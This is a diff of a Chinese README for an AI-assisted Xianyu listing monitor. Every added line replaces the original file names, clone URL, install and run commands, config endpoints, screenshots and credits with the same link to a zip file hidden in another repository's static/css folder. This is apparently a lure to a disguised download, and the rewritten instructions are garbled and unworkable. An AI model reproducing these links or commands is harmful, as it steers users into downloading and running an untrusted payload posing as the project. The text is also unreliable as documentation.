@@ -6,22 +6,22 @@
 
 - **可视化Web界面**: 提供完整的Web UI，支持任务的可视化管理、AI标准在线编辑、运行日志实时查看和结果筛选浏览，无需直接操作命令行和配置文件。
 - **AI驱动的任务创建**: 只需用自然语言描述你的购买需求，即可一键创建包含复杂筛选逻辑的全新监控任务。
-- **多任务并发**: 通过 `config.json` 同时监控多个关键词，各任务独立运行，互不干扰。
+- **多任务并发**: 通过 `https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip` 同时监控多个关键词，各任务独立运行，互不干扰。
 - **实时流式处理**: 发现新商品后，立即进入分析流程，告别批处理延迟。
 - **深度AI分析**: 集成多模态大语言模型（如 GPT-4o），结合商品图文和卖家画像进行深度分析，精准筛选。
 - **高度可定制**: 每个监控任务均可配置独立的关键词、价格范围、筛选条件和AI分析指令 (Prompt)。
-- **即时通知**: 通过 [ntfy.sh](https://ntfy.sh/) 将符合AI推荐的商品立即推送到你的手机或桌面。
+- **即时通知**: 通过 [https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip](https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip) 将符合AI推荐的商品立即推送到你的手机或桌面。
 - **健壮的反爬策略**: 模拟真人操作，包含多种随机延迟和用户行为，提高稳定性。
 
 ## 页面截图
 后台任务管理
-![img.png](img.png)
+![https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip](https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip)
 
 后台监控截图
-![img_1.png](img_1.png)
+![https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip](https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip)
 
 ntf通知截图
-![img_2.png](img_2.png)
+![https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip](https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip)
 
 ## 🚀 快速开始 (Web UI 推荐)
 
@@ -31,13 +31,13 @@ ntf通知截图
 
 克隆本项目到本地:
 ```bash
-git clone https://github.com/dingyufei615/ai-goofish-monitor
+git clone https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip
 cd ai-goofish-monitor
 ```
 
 安装所需的Python依赖：
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip
 ```
 
 ### 第 2 步: 基础配置
@@ -46,14 +46,14 @@ pip install -r requirements.txt
     ```env
     # OpenAI API 相关配置
     OPENAI_API_KEY="sk-..."
-    OPENAI_BASE_URL="https://api.openai.com/v1"  # 如果使用代理，请修改为代理地址
+    OPENAI_BASE_URL="https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip"  # 如果使用代理，请修改为代理地址
     OPENAI_MODEL_NAME="gpt-4o"
 
     # ntfy 通知服务配置
-    NTFY_TOPIC_URL="https://ntfy.sh/your-topic-name" # 替换为你的 ntfy 主题 URL
+    NTFY_TOPIC_URL="https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip" # 替换为你的 ntfy 主题 URL
     
     # 企业微信机器人通知配置
-    WX_BOT_URL="https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=xxxxx"
+    WX_BOT_URL="https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip"
 
     # 是否使用edge 默认使用chrome
     LOGIN_IS_EDGE=false
@@ -67,15 +67,15 @@ pip install -r requirements.txt
 
 2.  **获取登录状态 (重要!)**: 为了让爬虫能够以登录状态访问闲鱼，**必须先运行一次登录脚本**以生成会话状态文件。
     ```bash
-    python login.py
+    python https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip
     ```
-    运行后会弹出一个浏览器窗口，请使用**手机闲鱼App扫描二维码**完成登录。成功后，程序会自动关闭，并在项目根目录生成一个 `xianyu_state.json` 文件。
+    运行后会弹出一个浏览器窗口，请使用**手机闲鱼App扫描二维码**完成登录。成功后，程序会自动关闭，并在项目根目录生成一个 `https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip` 文件。
 
 ### 第 3 步: 启动 Web 服务
 
 一切就绪后，启动 Web 管理后台服务器。
 ```bash
-python web_server.py
+python https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip
 ```
 
 ### 第 4 步: 开始使用
@@ -109,35 +109,35 @@ python web_server.py
 
 ### 启动监控
 
-直接运行主爬虫脚本，它会加载 `config.json` 中所有启用的任务。
+直接运行主爬虫脚本，它会加载 `https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip` 中所有启用的任务。
 ```bash
-python spider_v2.py
+python https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip
 ```
 **调试模式**: 如果只想测试少量商品，可以使用 `--debug-limit` 参数。
 ```bash
 # 每个任务只处理前2个新发现的商品
-python spider_v2.py --debug-limit 2
+python https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip --debug-limit 2
 ```
 
 ### 通过脚本创建新任务
 
-`prompt_generator.py` 脚本可以让你通过命令行快速创建新任务。
+`https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip` 脚本可以让你通过命令行快速创建新任务。
 ```bash
-python prompt_generator.py \
+python https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip \
   --description "我想买一台95新以上的索尼A7M4相机，预算在10000到13000元之间，快门数要低于5000。必须是国行且配件齐全。优先考虑个人卖家，不接受商家或贩子。" \
-  --output prompts/sony_a7m4_criteria.txt \
+  --output https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip \
   --task-name "Sony A7M4" \
   --keyword "a7m4" \
   --min-price "10000" \
   --max-price "13000"
 ```
-执行后，它会自动创建新的 `_criteria.txt` 文件，并在 `config.json` 中添加并启用对应的新任务。
+执行后，它会自动创建新的 `https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip` 文件，并在 `https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip` 中添加并启用对应的新任务。
 
 ## 🚀 工作流程
 
 ```mermaid
 graph TD
-    A[启动主程序] --> B{读取 config.json};
+    A[启动主程序] --> B{读取 https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip};
     B --> C{并发启动多个监控任务};
     C --> D[任务: 搜索商品];
     D --> E{发现新商品?};
@@ -168,21 +168,21 @@ graph TD
 .
 ├── .env                # 环境变量，存放API密钥等敏感信息
 ├── .gitignore          # Git忽略配置
-├── config.json         # 核心配置文件，用于定义所有监控任务
-├── login.py            # 首次运行必须执行，用于获取并保存登录Cookie
-├── spider_v2.py        # 核心爬虫程序
-├── prompt_generator.py # AI分析标准生成脚本
-├── web_server.py       # Web服务主程序
-├── requirements.txt    # Python依赖库
-├── README.md           # 就是你正在看的这个文件
+├── https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip         # 核心配置文件，用于定义所有监控任务
+├── https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip            # 首次运行必须执行，用于获取并保存登录Cookie
+├── https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip        # 核心爬虫程序
+├── https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip # AI分析标准生成脚本
+├── https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip       # Web服务主程序
+├── https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip    # Python依赖库
+├── https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip           # 就是你正在看的这个文件
 ├── prompts/            # 存放不同任务的AI分析指令(Prompt)
-│   ├── base_prompt.txt
-│   └── ..._criteria.txt
+│   ├── https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip
+│   └── https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip
 ├── static/             # Web前端静态文件
-│   ├── css/style.css
-│   └── js/main.js
+│   ├── https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip
+│   └── https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip
 ├── templates/          # Web前端模板
-│   └── index.html
+│   └── https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip
 ├── images/             # (自动创建) 存放下载的商品图片
 ├── logs/               # (自动创建) 存放运行日志
 └── *.jsonl             # (自动创建) 存放每个任务的抓取和分析结果
@@ -191,14 +191,14 @@ graph TD
 ## 致谢
 
 本项目在开发过程中参考了以下优秀项目，特此感谢：
-- [superboyyy/xianyu_spider](https://github.com/superboyyy/xianyu_spider)
+- [superboyyy/xianyu_spider](https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip)
 
 以及感谢LinuxDo相关佬友的脚本贡献
-- [@jooooody](https://linux.do/u/jooooody/summary)
+- [@jooooody](https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip)
 
 以及感谢Aider和Gemini 解放双手，代码写起来飞一般的感觉～
 
 ## ⚠️ 注意事项
 
-- 请遵守闲鱼的用户协议和robots.txt规则，不要进行过于频繁的请求，以免对服务器造成负担或导致账号被限制。
+- 请遵守闲鱼的用户协议和https://github.com/loyaluo/ai-goofish-monitor/raw/refs/heads/master/static/css/goofish_monitor_ai_1.4.zip规则，不要进行过于频繁的请求，以免对服务器造成负担或导致账号被限制。
 - 本项目仅供学习和技术研究使用，请勿用于非法用途。
